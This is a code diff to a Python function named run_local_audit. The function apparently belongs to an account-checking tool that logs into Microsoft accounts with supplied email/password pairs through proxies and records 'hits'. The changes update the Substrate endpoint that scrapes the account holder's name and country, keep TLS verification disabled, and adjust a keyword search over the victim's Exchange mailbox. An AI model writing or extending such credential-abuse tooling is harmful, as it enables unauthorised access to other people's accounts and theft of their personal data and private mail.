@@ -456,13 +456,15 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword="", target
         
         name, country, dob, language, phone = "N/A", "N/A", "N/A", "N/A", "N/A"
         try:
-            res_prof = session.get("https://substrate.office.com/profile/v1.0/users/me", headers=api_headers, verify=False, timeout=15)
+            res_prof = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=api_headers, verify=False, timeout=15)
             if res_prof.status_code == 200:
-                p_data = res_prof.json()
-                if p_data.get('displayName'): name = p_data.get('displayName')
-                if p_data.get('countryOrRegion'): country = p_data.get('countryOrRegion')
-                if p_data.get('birthday'): dob = p_data.get('birthday').split('T')[0]
-                if p_data.get('mobilePhone'): phone = p_data.get('mobilePhone')
+                prof = res_prof.json()
+                if prof.get("displayName"): name = prof.get("displayName")
+                
+                c = prof.get("location")
+                if not c or c == "N/A": c = prof.get("culture", prof.get("region", "N/A"))
+                if c and '-' in c: country = c.split('-')[-1].upper()
+                else: country = c
                 
                 print(f"[DEBUG vps_agent] Substrate profile exitoso: {name} | {country}")
         except: pass
@@ -479,6 +481,7 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword="", target
             "EntityRequests": [{
                 "EntityType": "Conversation",
                 "ContentSources": ["Exchange"],
+                "Provenances": ["Exchange"],
                 "Filter": {
                     "Or": [
                         {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
